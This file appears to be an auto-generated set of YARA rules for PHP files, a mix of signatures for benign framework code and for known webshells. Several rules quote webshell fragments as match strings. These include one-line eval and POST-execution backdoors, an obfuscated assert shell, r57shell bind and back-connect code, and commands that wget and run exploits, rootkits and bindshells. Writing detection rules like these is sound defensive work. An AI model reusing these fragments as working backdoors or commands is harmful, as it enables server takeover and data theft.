      $s4 = "$props = $this->server->getPropertiesForPath('/principals/user1', [" fullword ascii
      $s5 = "* There are two properties for availability. The server should" fullword ascii
      $s6 = "foreach ($this->caldavBackend->getCalendarsForUser('principals/user1') as $calendar) {" fullword ascii
      $s7 = "$this->assertArrayHasKey('{urn:ietf:params:xml:ns:caldav}calendar-user-address-set', $props[0][200]);" fullword ascii
      $s8 = "$this->assertArrayHasKey('{urn:ietf:params:xml:ns:caldav}calendar-user-type', $props[0][200]);" fullword ascii
      $s9 = "$this->assertEquals('calendars/user1/outbox/', $prop->getHref());" fullword ascii
      $s10 = "$this->assertEquals('calendars/user1/inbox/', $prop->getHref());" fullword ascii
      $s11 = "$this->assertEquals('calendars/user1/default/', $prop->getHref());" fullword ascii
      $s12 = "$this->assertArrayHasKey('{urn:ietf:params:xml:ns:caldav}schedule-default-calendar-URL', $props[0][404]);" fullword ascii
      $s13 = "$this->assertArrayHasKey('{urn:ietf:params:xml:ns:caldav}schedule-default-calendar-URL', $props[0][200]);" fullword ascii
      $s14 = "$prop = $props[0][200]['{urn:ietf:params:xml:ns:caldav}calendar-user-address-set'];" fullword ascii
      $s15 = "* automatically map the old property to the standard property." fullword ascii
      $s16 = "$oldProp = '{http://calendarserver.org/ns/}calendar-availability';" fullword ascii
      $s17 = "$this->server->getProperties($path, [$oldProp])" fullword ascii
      $s18 = "$this->server->getProperties($path, [$newProp])" fullword ascii
      $s19 = "$this->assertArrayHasKey('{urn:ietf:params:xml:ns:caldav}schedule-outbox-URL', $props[0][404]);" fullword ascii
      $s20 = "$this->assertArrayHasKey('{urn:ietf:params:xml:ns:caldav}schedule-inbox-URL', $props[0][404]);" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 20KB and
      8 of them
}

rule PartsBuilder
{
   meta:
      description = "php22 - file PartsBuilder.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "8acbea8965be62eea3f8e29daca7503c62172ae96615017c73c701cc891511f7"
   strings:
      $s1 = "namespace Pimcore\\Process;" fullword ascii
      $s2 = "public function getParts(): array" fullword ascii
      $s3 = "public function __construct(array $arguments = [], array $options = [])" fullword ascii
      $s4 = "public function addOption(string $option, $value = null)" fullword ascii
      $s5 = "return array_merge($this->arguments, $this->options);" fullword ascii
      $s6 = "private $arguments = [];" fullword ascii
      $s7 = "public function addOptions(array $options)" fullword ascii
      $s8 = "public function addArguments(array $arguments)" fullword ascii
      $s9 = "private $options = [];" fullword ascii
      $s10 = "$this->addOption($option, $value);" fullword ascii
      $s11 = "$this->addArguments($arguments);" fullword ascii
      $s12 = "public function addArgument($argument)" fullword ascii
      $s13 = "if (!is_bool($value) && $value) {" fullword ascii
      $s14 = "if (is_bool($value) && !$value) {" fullword ascii
      $s15 = "// do not set option if it is false" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 5KB and
      8 of them
}


rule php22_qiang13
{
   meta:
      description = "php22 - file qiang13.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "6f297cd939fdfc7f4607c35df022bfde7e98525ce9f0cafc06de00471b9634d2"
   strings:
      $s1 = "<?php $_POST['sa']($_POST['sb'],$_POST['sc'])?>" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule PatternMatcher
{
   meta:
      description = "php22 - file PatternMatcher.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "d9a25b84d641aa6ce03c139318b31dedddff0e7a8868f84fd07ab5a51f09f33a"
   strings:
      $s1 = "* Tries to match the given string with the expected pattern. Returns" fullword ascii
      $s2 = "* @return boolean Whether or not the string matches the expect pattern" fullword ascii
      $s3 = "* Creates a new PatternMatcher for matching a string against a regular" fullword ascii
      $s4 = "* @param  boolean $negated Whether or not to print the negated message" fullword ascii
      $s5 = "* @return string  The error message" fullword ascii
      $s6 = "* Returns an error message indicating why the match failed, and the" fullword ascii
      $s7 = "public function getFailureMessage($negated = false)" fullword ascii
      $s8 = "* @param mixed $pattern The pattern to match" fullword ascii
      $s9 = "* negation of the message if $negated is true." fullword ascii
      $s10 = "* true if it matches, false otherwise." fullword ascii
      $s11 = "return \"Expected \\\"{$this->subject}\\\" not to match {$this->pattern}\";" fullword ascii
      $s12 = "* expression." fullword ascii
      $s13 = "return \"Expected \\\"{$this->subject}\\\" to match {$this->pattern}\";" fullword ascii
      $s14 = "* @param  mixed   $subject The string to test" fullword ascii
      $s15 = "return (preg_match($this->pattern, $subject) > 0);" fullword ascii
      $s16 = "class PatternMatcher extends AbstractMatcher implements MatcherInterface" fullword ascii
      $s17 = "private $subject;" fullword ascii
      $s18 = "namespace pho\\Expectation\\Matcher;" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 4KB and
      8 of them
}

rule ProgressBarStyle
{
   meta:
      description = "php22 - file ProgressBarStyle.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "b28557773f68a7cd3041e8bc3f98724cda36cddbfc4b6dafa664de70d5326f4e"
   strings:
      $s1 = "namespace CLIFramework\\Component\\Progress;" fullword ascii
      $s2 = "use CLIFramework\\ConsoleInfo\\ConsoleInfoFactory;" fullword ascii
      $s3 = "use CLIFramework\\ConsoleInfo\\EnvConsoleInfo;" fullword ascii
      $s4 = "use CLIFramework\\Formatter;" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule RequestHelper
{
   meta:
      description = "php22 - file RequestHelper.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "e5fd7ff67803a578600372252adeef01e0d53a73376e2163366a50fc6de56910"
   strings:
      $s1 = "namespace Symfony\\Bundle\\FrameworkBundle\\Templating\\Helper;" fullword ascii
      $s2 = "* RequestHelper provides access to the current request parameters." fullword ascii
      $s3 = "* @see Request::get()" fullword ascii
      $s4 = "return $this->getRequest()->get($key, $default);" fullword ascii
      $s5 = "public function getParameter($key, $default = null)" fullword ascii
      $s6 = "* Returns a parameter from the current request object." fullword ascii
      $s7 = "use Symfony\\Component\\Templating\\Helper\\Helper;" fullword ascii
      $s8 = "* @param string $default A default value" fullword ascii
      $s9 = "use Symfony\\Component\\HttpFoundation\\RequestStack;" fullword ascii
      $s10 = "throw new \\LogicException('A Request must be available.');" fullword ascii
      $s11 = "* @param string $key     The name of the parameter" fullword ascii
      $s12 = "return $this->requestStack->getCurrentRequest();" fullword ascii
      $s13 = "if (!$this->requestStack->getCurrentRequest()) {" fullword ascii
      $s14 = "private function getRequest()" fullword ascii
      $s15 = "return $this->getRequest()->getLocale();" fullword ascii
      $s16 = "* Returns the locale." fullword ascii
      $s17 = "public function __construct(RequestStack $requestStack)" fullword ascii
      $s18 = "$this->requestStack = $requestStack;" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 4KB and
      8 of them
}

rule PdoDbalCacheTest
{
   meta:
      description = "php22 - file PdoDbalCacheTest.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "33ae52c34c103094d61ff90c6dd6d55ef3cbf2252190d32e0b25b38559fb10f4"
   strings:
      $s1 = "return new PdoCache(DriverManager::getConnection(array('driver' => 'pdo_sqlite', 'path' => self::$dbFile)), '', $default" fullword ascii
      $s2 = "$pool = new PdoCache(DriverManager::getConnection(array('driver' => 'pdo_sqlite', 'path' => self::$dbFile)));" fullword ascii
      $s3 = "self::$dbFile = tempnam(sys_get_temp_dir(), 'sf_sqlite_cache');" fullword ascii
      $s4 = "* @group time-sensitive" fullword ascii
      $s5 = "use Symfony\\Component\\Cache\\Tests\\Traits\\PdoPruneableTrait;" fullword ascii
      $s6 = "use Doctrine\\DBAL\\DriverManager;" fullword ascii
      $s7 = "return new PdoCache(DriverManager::getConnection(array('driver' => 'pdo_sqlite', 'path' => self::$dbFile)), '', $defaultLifetime" ascii
      $s8 = "self::markTestSkipped('Extension pdo_sqlite required.');" fullword ascii
      $s9 = "use Symfony\\Component\\Cache\\Simple\\PdoCache;" fullword ascii
      $s10 = "use PdoPruneableTrait;" fullword ascii
      $s11 = "namespace Symfony\\Component\\Cache\\Tests\\Simple;" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 3KB and
      8 of them
}

rule r57shell__13_
{
   meta:
      description = "php22 - file r57shell (13).php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "7063b68f92507c1b50c0e50403c260ca21f7f07b3dd2f7ca8abd2375f2b00626"
   strings:
      $x1 = "<input type=\"submit\" name=\"command\" value=\"Execute\" id=\"command_button\" style=\"font-size:14px;\">" fullword ascii
      $x2 = "* Execute command and return the result" fullword ascii
      $x3 = "$my_cmd=execute_with_trap($_POST['cmd']);" fullword ascii
      $s4 = "$fp=fopen($tmpfile,\"w\");fwrite($fp,$perl_bs);fclose($fp);//writing perl payload to tempfile" fullword ascii
      $s5 = "<div style=\"font-size:12px;\">Executed:&nbsp;&nbsp;&nbsp;<strong>{CMD}</strong></div>" fullword ascii
      $s6 = "* Simple command execution" fullword ascii
      $s7 = "If we got some \"cd\" command the behavior should be like in a real shell enviroment" fullword ascii
      $s8 = "My PHP Shell - A very simple web shell (very much inspired from r57shell - rst team)" fullword ascii
      $s9 = "execute_simple(\"rm -f $tmpfile\");" fullword ascii
      $s10 = "$content['RESULT'] = $my_string .\"$ \" . $_POST['cmd'] . \"\\n\" . $my_cmd;" fullword ascii
      $s11 = "<input type=\"text\" name=\"bind_port\" id=\"bind_port\" value=\"{PORT}\" size=\"5\"> <input type=\"submit\" name=\"bind\" value" ascii
      $s12 = "k='httpRequest(\"POST\",\"{PHP_SELF}\",true,\"ajax=1&fn=bind_shell_perl&nr=1&parm0=\" + document.getElementById(\"bind_port\").v" ascii
      $s13 = "save_buffer($_SESSION['buf'], $_SESSION['buf_size'], \"$ \" . $_POST['cmd'] . \"\\n\");" fullword ascii
      $s14 = "move_uploaded_file( $_FILES['file']['tmp_name'], $_POST['file_path'] . \"/\" . $_FILES['file']['name'] );" fullword ascii
      $s15 = "\\$iaddr=inet_aton(\\$target) || die(\"Error: \\$!\\n\");" fullword ascii
      $s16 = "request.setRequestHeader(\"Content-Type\", \"application/x-www-form-urlencoded; charset=UTF-8\");" fullword ascii
      $s17 = "// Default port for bindshell and back connect" fullword ascii
      $s18 = "\" + document.getElementById(\"back_port\").value); return false;'>" fullword ascii
      $s19 = "* Getting previous commands buffer" fullword ascii
      $s20 = "<!-- Here we have bind,backconnect,file upload,edit file -->" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 50KB and
      1 of ($x*) and 4 of them
}

rule remove_class
{
   meta:
      description = "php22 - file remove.class.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "cf3beefedf5260898f5e3c11fad66dfe5c2351d8d776729ea98ed34f8f16e67f"
   strings:
      $s1 = "* @subpackage processors.context" fullword ascii
      $s2 = "if ($this->object->get('key') == 'web' || $this->object->get('key') == 'mgr') {" fullword ascii
      $s3 = "return 'modContextRemoveProcessor';" fullword ascii
      $s4 = "class modContextRemoveProcessor extends modObjectRemoveProcessor {" fullword ascii
      $s5 = "* @param string $key The key of the context. Cannot be mgr or web." fullword ascii
      $s6 = "$this->modx->removeCollection('modTemplateVarResource',array(" fullword ascii
      $s7 = "'context_key' => $this->object->get('key')," fullword ascii
      $s8 = "$resources = $this->modx->getIterator('modResource',array(" fullword ascii
      $s9 = "/* Remove content values.*/" fullword ascii
      $s10 = "public $languageTopics = array('context');" fullword ascii
      $s11 = "* Removes a context" fullword ascii
      $s12 = "/* prevent removing of mgr/web contexts */" fullword ascii
      $s13 = "$resourceIds[] = $resource->get('id');" fullword ascii
      $s14 = "/* Retrieve all resources from this context. */" fullword ascii
      $s15 = "* @package modx" fullword ascii
      $s16 = "'contentid:IN' => $resourceIds," fullword ascii
      $s17 = "public $primaryKeyField = 'key';" fullword ascii
      $s18 = "/* Remove resources. */" fullword ascii
      $s19 = "$this->modx->removeCollection('modResource',array(" fullword ascii
      $s20 = "return $this->modx->lexicon('permission_denied');" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 4KB and
      8 of them
}

rule ProxyReadTest
{
   meta:
      description = "php22 - file ProxyReadTest.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "6f2540838f6f5bfc0a57c7acd7f999677a4ebf3d6e8dbad9c87a5a0e3c86ffcb"
   strings:
      $s1 = "$this->assertEquals('principal/user/calendar-proxy-read', $i->getPrincipalUrl());" fullword ascii
      $s2 = "$this->assertEquals('calendar-proxy-read', $i->getDisplayName());" fullword ascii
      $s3 = "* @expectedException Sabre\\DAV\\Exception\\Forbidden" fullword ascii
      $s4 = "$this->assertEquals('calendar-proxy-read', $i->getName());" fullword ascii
      $s5 = "class ProxyReadTest extends \\PHPUnit_Framework_TestCase {" fullword ascii
      $s6 = "$this->assertEquals([], $i->getAlternateUriSet());" fullword ascii
      $s7 = "$this->assertEquals([], $i->getGroupMemberSet());" fullword ascii
      $s8 = "$this->assertEquals([], $i->getGroupMembership());" fullword ascii
      $s9 = "$this->assertNull($i->getLastModified());" fullword ascii
      $s10 = "$i->getPrincipalUrl() => ['principals/foo']" fullword ascii
      $s11 = "$principal = new ProxyRead($backend, [" fullword ascii
      $s12 = "function testGetPrincipalUri() {" fullword ascii
      $s13 = "function testGetLastModified() {" fullword ascii
      $s14 = "function testGetGroupMembership() {" fullword ascii
      $s15 = "function testGetAlternateUriSet() {" fullword ascii
      $s16 = "function testGetGroupMemberSet() {" fullword ascii
      $s17 = "$i = $this->getInstance();" fullword ascii
      $s18 = "function testGetDisplayName() {" fullword ascii
      $s19 = "function testGetName() {" fullword ascii
      $s20 = "function getInstance() {" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 6KB and
      8 of them
}

rule php22_qiang10
{
   meta:
      description = "php22 - file qiang10.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "d85930f3b2fe3782db59b39786b9ba316b3391867e23192898cc26511e544833"
   strings:
      $s1 = "<?php eval_r($_POST[sb])?>" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule PackageService
{
   meta:
      description = "php22 - file PackageService.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "5b8f8ca16aa6b47e104e0ce223b4c4aac8f0a2a252835e5cbaa5fce631d62f3b"
   strings:
      $x1 = "* @param array $data data to be passed to the Package::validate_install(), Package::install(), ContentSwapper::swapContent(" fullword ascii
      $x2 = "* Get the controllers of packages that have newer versions in the local packages directory than those which are in the Pack" fullword ascii
      $s3 = "* @param bool $onlyNotInstalled true to get the controllers of not installed packages, false to get all the package control" fullword ascii
      $s4 = "* @param bool $onlyNotInstalled true to get the controllers of not installed packages, false to get all the package controllers" fullword ascii
      $s5 = "* Get the controllers of the packages that have an upgraded version available in the marketplace." fullword ascii
      $s6 = "if (version_compare($p->getPackageVersion(), $p->getPackageVersionUpdateAvailable(), '<')) {" fullword ascii
      $s7 = "if (version_compare($p->getPackageVersion(), $entity->getPackageVersion(), '>')) {" fullword ascii
      $s8 = "if ($u->isSuperUser() && $swapper->allowsFullContentSwap($p) && $data['pkgDoFullContentSwap']) {" fullword ascii
      $s9 = "* Get the package controllers of the available packages." fullword ascii
      $s10 = "* Get the package entities of installed packages." fullword ascii
      $s11 = "* Get the controller of a package given its handle." fullword ascii
      $s12 = "* Get the handles of all the installed packages." fullword ascii
      $s13 = "* @param \\Concrete\\Core\\Package\\Package $p the controller of the package to be uninstalled" fullword ascii
      $s14 = "* @param \\Concrete\\Core\\Package\\Package $p the controller of the package to be installed" fullword ascii
      $s15 = "* @param EntityManagerInterface $entityManager the EntityManagerInterface instance" fullword ascii
      $s16 = "* Get a package entity given its handle." fullword ascii
      $s17 = "* @param array $data data to be passed to the Package::validate_install(), Package::install(), ContentSwapper::swapContent(), Co" ascii
      $s18 = "$cl = \\Concrete\\Core\\Foundation\\ClassLoader::getInstance();" fullword ascii
      $s19 = "* Get a package entity given its ID." fullword ascii
      $s20 = "* @param \\Concrete\\Core\\Package\\Package $p The controller of package" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 30KB and
      1 of ($x*) and 4 of them
}

rule ProvinceApiTest
{
   meta:
      description = "php22 - file ProvinceApiTest.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "a4acc5c69e6c9359ef0d801e70f7c5eba5c06a0f6c57341933b2dd7330410e57"
   strings:
      $s1 = "Data['province_BE_limburg']->getCode(), [], [], static::$authorizedHeaderWithContentType);" fullword ascii
      $s2 = "a['province_BE_limburg']->getCode(), [], [], static::$authorizedHeaderWithContentType);" fullword ascii
      $s3 = "private static $authorizedHeaderWithContentType = [" fullword ascii
      $s4 = "'HTTP_Authorization' => 'Bearer SampleTokenNjZkNjY2MDEwMTAzMDkxMGE0OTlhYzU3NzYyMTE0ZGQ3ODcyMDAwM2EwMDZjNDI5NDlhMDdlMQ'," fullword ascii
      $s5 = "$this->client->request('DELETE', '/api/v1/countries/' . $countryData['country_BE']->getCode() . '/provinces/' . $country" fullword ascii
      $s6 = "$this->client->request('GET', '/api/v1/countries/' . $countryData['country_BE']->getCode() . '/provinces/' . $countryDat" fullword ascii
      $s7 = "$this->assertResponseCode($response, Response::HTTP_NO_CONTENT);" fullword ascii
      $s8 = "$this->assertResponse($response, 'authentication/access_denied_response', Response::HTTP_UNAUTHORIZED);" fullword ascii
      $s9 = "$this->client->request('GET', '/api/v1/countries/FR/provinces/centre');" fullword ascii
      $s10 = "$this->assertResponse($response, 'error/not_found_response', Response::HTTP_NOT_FOUND);" fullword ascii
      $s11 = "$this->client->request('GET', '/api/v1/countries/' . $countryData['country_BE']->getCode() . '/provinces/' . $countryData['provi" ascii
      $s12 = "$this->client->request('DELETE', '/api/v1/countries/' . $countryData['country_BE']->getCode() . '/provinces/' . $countryData['pr" ascii
      $s13 = "public function it_denies_getting_province_for_non_authenticated_user()" fullword ascii
      $s14 = "use Symfony\\Component\\HttpFoundation\\Response;" fullword ascii
      $s15 = "$this->assertResponse($response, 'province/show_response', Response::HTTP_OK);" fullword ascii
      $s16 = "$countryData = $this->loadFixturesFromFile('resources/countries.yml');" fullword ascii
      $s17 = "public function it_allows_to_get_province()" fullword ascii
      $s18 = "$response = $this->client->getResponse();" fullword ascii
      $s19 = "$this->loadFixturesFromFile('authentication/api_administrator.yml');" fullword ascii
      $s20 = "public function it_allows_to_delete_province()" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 7KB and
      8 of them
}

rule php_shell_assert_remix2
{
   meta:
      description = "php22 - file php-shell-assert-remix2.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "c17f88772db6fce925e5ac0b9fa5f70ea1c362514bc067fadecd4075d93ce710"
   strings:
      $s1 = "$result .= chr(ord($string[$index]) - 3);" fullword ascii
      $s2 = "$result .= chr(ord($string[$index]) + 3);" fullword ascii
      $s3 = "for ($index = 0;$index < strlen($string);$index += 1)" fullword ascii
      $s4 = "$a = '_GET';" fullword ascii
      $s5 = "function decode($string) {" fullword ascii
      $s6 = "$a('$code=function() {'.$_REQUEST['code'].'}');" fullword ascii
      $s7 = "$a = decode('dvvhuw');" fullword ascii
   condition:
      uint16(0) == 0x3c0a and filesize < 1KB and
      all of them
}

rule PlainTextTest
{
   meta:
      description = "php22 - file PlainTextTest.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "7517d7b31e2245f1e1d5f4a15bcde122fcd49cfa1603fea914b4baab3550a955"
   strings:
      $s1 = "* Matches a plain label without 'for' attribute" fullword ascii
      $s2 = "* Matches an plain text input as a p tag" fullword ascii
      $s3 = "* Matches an plain text fallback input" fullword ascii
      $s4 = "* Matches a Form Static Group" fullword ascii
      $s5 = "* Which is a disabled input" fullword ascii
      $s6 = "* Matches a plain label" fullword ascii
      $s7 = "* @param  string $label" fullword ascii
      $s8 = "$this->former->framework('TwitterBootstrap3');" fullword ascii
      $s9 = "$this->former->framework('ZurbFoundation');" fullword ascii
      $s10 = "$zurb = $this->former->plaintext('foo')->value('bar')->__toString();" fullword ascii
      $s11 = "$input = $this->former->plaintext('foo')->value('bar')->__toString();" fullword ascii
      $s12 = "$nude = $this->former->plaintext('foo')->value('bar')->__toString();" fullword ascii
      $s13 = "////////////////////////////// MATCHERS ////////////////////////////" fullword ascii
      $s14 = "////////////////////////////// ASSERTIONS //////////////////////////" fullword ascii
      $s15 = "//////////////////////////////// TESTS /////////////////////////////" fullword ascii
      $s16 = "$this->former->framework('Nude');" fullword ascii
      $s17 = "$this->assertHTML($this->matchPlainLabelWithBS3(), $input);" fullword ascii
      $s18 = "$this->assertHTML($this->matchPlainTextInput(), $input);" fullword ascii
      $s19 = "$this->assertHTML($this->matchPlainTextFallbackInput(), $zurb);" fullword ascii
      $s20 = "$this->assertHTML($this->matchPlainTextFallbackInput(), $nude);" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 8KB and
      8 of them
}

rule ParamConverterManager
{
   meta:
      description = "php22 - file ParamConverterManager.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "a424e8604d778f0f81f06d1618099eb0ff1251e509a0b4796595a3b70c8a67bc"
   strings:
      $s1 = "* Applies all converters to the passed configurations and stops when a" fullword ascii
      $s2 = "* converter is applied it will move on to the next configuration and so on." fullword ascii
      $s3 = "* Applies converter on request based on the given configuration." fullword ascii
      $s4 = "* converters with a $priority. If you pass a $priority = null then the" fullword ascii
      $s5 = "* Converters match either explicitly via $name or by iteration over all" fullword ascii
      $s6 = "\"Converter '%s' does not support conversion of parameter '%s'.\"," fullword ascii
      $s7 = "* @author Henrik Bjornskov <henrik@bjrnskov.dk>" fullword ascii
      $s8 = "* be invoked explicitly." fullword ascii
      $s9 = "use Sensio\\Bundle\\FrameworkExtraBundle\\Configuration\\ParamConverter;" fullword ascii
      $s10 = "$value = $request->attributes->get($configuration->getName());" fullword ascii
      $s11 = "* @param array|object $configurations" fullword ascii
      $s12 = "if ($converterName = $configuration->getConverter()) {" fullword ascii
      $s13 = "* @param int    $priority the priority (between -10 and 10)" fullword ascii
      $s14 = "\"No converter named '%s' found for conversion of parameter '%s'.\"," fullword ascii
      $s15 = "* Returns all registered param converters." fullword ascii
      $s16 = "* @return array An array of param converters" fullword ascii
      $s17 = "private function applyConverter(Request $request, ParamConverter $configuration)" fullword ascii
      $s18 = "namespace Sensio\\Bundle\\FrameworkExtraBundle\\Request\\ParamConverter;" fullword ascii
      $s19 = "* added converter will not be part of the iteration chain and can only" fullword ascii
      $s20 = "$configuration->getName()" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 10KB and
      8 of them
}

rule repositoryFile
{
   meta:
      description = "php22 - file repositoryFile.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "4c623518b46f3a728bbab05170f1d03faefe1f1d4e54e58ec604eac55e5e7f1b"
   strings:
      $s1 = "<div><a target=\"_blank\" class=\"ipsLink ipsFileName\" href=\"<?php echo ipFileUrl('file/repository/' . $file) ?" fullword ascii
      $s2 = "<div><a target=\"_blank\" class=\"ipsLink ipsFileName\" href=\"\"></a></div>" fullword ascii
      $s3 = "<div class=\"well _file ipsFile ipsFileTemplate hidden\">" fullword ascii
      $s4 = "<a <?php echo $attributesStr; ?> class=\"btn btn-default ipsSelect ipsFileAddButton\" href=\"#\"><?php _e(" fullword ascii
      $s5 = "data-filelimit=\"<?php echo (int)$fileLimit; ?>\"" fullword ascii
      $s6 = "<button type=\"button\" class=\"close ipsRemove\" aria-hidden=\"true\">&times;</button>" fullword ascii
      $s7 = "<div><a target=\"_blank\" class=\"ipsLink ipsFileName\" href=\"<?php echo ipFileUrl('file/repository/' . $file) ?>\"><?php echo " ascii
      $s8 = "<?php if ($value && is_array($value)) { ?>" fullword ascii
      $s9 = "data-filterextensions='<?php echo escAttr(json_encode($filterExtensions)); ?>'>" fullword ascii
      $s10 = "<div class=\"file <?php echo escAttr($classes); ?> ipsRepositoryFileContainer\"" fullword ascii
      $s11 = "<input type=\"hidden\" name=\"\" value=\"\"/>" fullword ascii
      $s12 = "<?php foreach ($value as $file) { ?>" fullword ascii
      $s13 = ">\"><?php echo esc($file); ?></a></div>" fullword ascii
      $s14 = "<button type=\"button\" class=\"close ipsRemove\">&times;</button>" fullword ascii
      $s15 = "<input type=\"hidden\" name=\"<?php echo escAttr($inputName); ?>[]\"" fullword ascii
   condition:
      uint16(0) == 0x643c and filesize < 4KB and
      8 of them
}

rule OrderPaymentTransitions
{
   meta:
      description = "php22 - file OrderPaymentTransitions.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "6f7583933a2fcc6a0b48886f689a49d37010dd3f2eda9ab4e0cdad966fe4a203"
   strings:
      $s1 = "namespace Sylius\\Component\\Core;" fullword ascii
      $s2 = "public const TRANSITION_PARTIALLY_PAY = 'partially_pay';" fullword ascii
      $s3 = "public const TRANSITION_PARTIALLY_REFUND = 'partially_refund';" fullword ascii
      $s4 = "public const TRANSITION_REQUEST_PAYMENT = 'request_payment';" fullword ascii
      $s5 = "public const TRANSITION_REFUND = 'refund';" fullword ascii
      $s6 = "public const GRAPH = 'sylius_order_payment';" fullword ascii
      $s7 = "public const TRANSITION_PAY = 'pay';" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 2KB and
      all of them
}

rule oi_php_decode
{
   meta:
      description = "php22 - file oi.php.decode.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "9978ea2bdfbadad460a3871b5a357cc25342820808536cb3fb652f2324df2dfb"
   strings:
      $x1 = "else {$tmp = htmlspecialchars(\"./dump_\".getenv(\"SERVER_NAME\").\"_\".$sql_db.\"_\".date(\"d-m-Y-H-i-s\").\".sql\");}" fullword ascii
      $x2 = "$body = \" [+]Shell: $target \\n [+]Injector: $visitor \\n [+]uname -a: $uname \\n [+]User: $id\";" fullword ascii
      $x3 = "$file = $tmpdir.\"dump_\".getenv(\"SERVER_NAME\").\"_\".$db.\"_\".date(\"d-m-Y-H-i-s\").\".sql\";" fullword ascii
      $x4 = "array(\"wget Sudo Exploit\",\"wget http://www.securityfocus.com/data/vulnerabilities/exploits/sudo-exploit.c\")," fullword ascii
      $x5 = "exit(\"<a href=\\\"$sh_mainurl\\\">$sh_name</a>: Access Denied - Your host (\".getenv(\"REMOTE_ADDR\").\") not allowed\");" fullword ascii
      $x6 = "function exftpbrutecheck($host,$port,$timeout,$login,$pass,$sh,$fqb_onlywithsh) {" fullword ascii
      $x7 = "array(\"wget & extract psyBNC\",\"wget \".$sh_mainurl.\"psy.tar.gz;tar -zxf fx.tgz;cd .psy;./config 50000;./fuck;./run\")," fullword ascii
      $x8 = "echo \"<br><br><input type=\\\"submit\\\" name=\\\"submit\\\" value=\\\"Dump\\\"><br><br><b><sup>1</sup></b> - all, if empty\";" fullword ascii
      $x9 = "displaysecinfo(\"Kernel Version\",exexec(\"sysctl -a | grep version\"));" fullword ascii
      $x10 = "elseif ( enabled(\"passthru\") ) { @ob_start(); passthru($cmd); $output = @ob_get_contents(); @ob_end_clean(); }" fullword ascii
      $x11 = "elseif ( enabled(\"system\") ) { @ob_start(); system($cmd); $output = @ob_get_contents(); @ob_end_clean(); }" fullword ascii
      $x12 = "if ( enabled(\"system\") ) { @ob_start(); system($cmd); $output = @ob_get_contents(); @ob_end_clean(); }" fullword ascii
      $x13 = "\"<tr><td></td><td><input type=\\\"checkbox\\\" name=\\\"fqb_onlywithsh\\\" value=\\\"1\\\"> Users only with shell</td></tr>\"." fullword ascii
      $x14 = "echo \"<b>Download: </b>&nbsp;<input type=\\\"checkbox\\\" name=\\\"sql_dump_download\\\" value=\\\"1\\\" checked><br><br>\";" fullword ascii
      $x15 = "srv_info(\"User\",($win) ? get_current_user().\" (uid=\".getmyuid().\" gid=\".getmygid().\")\" : exexec(\"id\"));" fullword ascii
      $x16 = "# MySQL version: (\".mysql_get_server_info().\") running on \".getenv(\"SERVER_ADDR\").\" (\".getenv(\"SERVER_NAME\").\")\".\"" fullword ascii
      $x17 = "array(\"wget RatHole 1.2 (Linux & BSD)\",\"wget http://packetstormsecurity.org/UNIX/penetration/rootkits/rathole-1.2.tar.gz\")," fullword ascii
      $x18 = "echo \"<b>Dumped! Dump has been writed to \\\"\".htmlspecialchars(realpath($sql_dump_file)).\"\\\" (\".view_size(filesiz" fullword ascii
      $x19 = "array(\"Downloaders?\",\"which wget curl w3m lynx fetch lwp-download\")," fullword ascii
      $x20 = "array(\"wget & run BindDoor\",\"wget \".$sh_mainurl.\"bind.tgz;tar -zxvf bind.tgz;./4877\")," fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 500KB and
      1 of ($x*)
}

rule PhpFilesTrait
{
   meta:
      description = "php22 - file PhpFilesTrait.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "2ae3448c8dc3e92c5d7374fb4f6f1a1a3f52186023aea59b29af1b87921c3375"
   strings:
      $s1 = "* @author Nicolas Grekas <p@tchwork.com>" fullword ascii
      $s2 = "* @author Rob Frawley 2nd <rmf@src.run>" fullword ascii
      $s3 = "throw new InvalidArgumentException(sprintf('Cache key \"%s\" has non-serializable %s value.', $key, gettype($value)));" fullword ascii
      $s4 = "throw new InvalidArgumentException(sprintf('Cache key \"%s\" has non-serializable %s value.', $key, gettype($value" fullword ascii
      $s5 = "foreach (new \\RecursiveIteratorIterator(new \\RecursiveDirectoryIterator($this->directory, \\FilesystemIterator::SKIP_" fullword ascii
      $s6 = "* @author Piotr Stankowski <git@trakos.pl>" fullword ascii
      $s7 = "if ($unserialized !== $value || (false !== strpos($serialized, ';R:') && preg_match('/;R:[1-9]/', $serialized)))" fullword ascii
